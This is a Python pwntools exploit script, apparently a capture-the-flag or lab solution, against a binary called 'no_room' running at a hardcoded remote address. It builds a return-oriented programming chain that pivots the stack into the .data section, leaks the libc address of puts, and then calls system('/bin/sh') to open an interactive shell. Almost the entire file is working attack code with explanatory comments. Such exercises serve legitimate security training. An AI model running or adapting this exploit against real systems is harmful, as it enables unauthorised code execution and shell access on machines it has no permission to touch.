from pwn import *


# p = process('./no_room')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('141.85.224.109', 41448)
libc = ELF('./libc.so.6')

pop_rdi_ret = 0x400773
stack_buff_size = 0x30
data_buff_size = 0x7f
puts_plt = 0x4004e0
puts_got = 0x601018
main_addr = 0x4005f7 + 1  # Skip `push rbp` at the beginning of `main`
data_addr = 0x602080
leave_ret = 0x4006d7

p.recvline()
p.recvline()
# Add 8 bytes of padding for the `leave ; ret` gadget used below.
data_payload = b'a' * 8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + \
	p64(main_addr)
p.sendline(data_payload)
p.recvline()

# Pivot the stack to the `.data` section.
# End the stack payload with a `leave ; ret` gadget to also make `rsp` point to
# the new stack in the `.data` section
stack_payload = b'a' * stack_buff_size + p64(data_addr) + p64(leave_ret)
p.sendline(stack_payload)
p.recvline()

puts_addr = u64(p.recvline().rstrip() + b'\x00\x00')
libc.address = puts_addr - libc.symbols['puts']
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))

p.recvline()
p.recvline()
# Don't overwrite `rbp` because of the mismatch between the stack buffer and the
# data buffer.
final_payload =  b'a' * stack_buff_size + p64(pop_rdi_ret) + \
	p64(bin_sh_addr) + p64(system_addr)
# Add trailing `a`s so the \0 added by the binary at the end of the input
# doesn't overwrite the payload.
final_payload += b'a' * (data_buff_size - len(final_payload))
p.sendline(final_payload)
p.recvline()

p.sendline(b'')
p.recvline()

p.interactive()
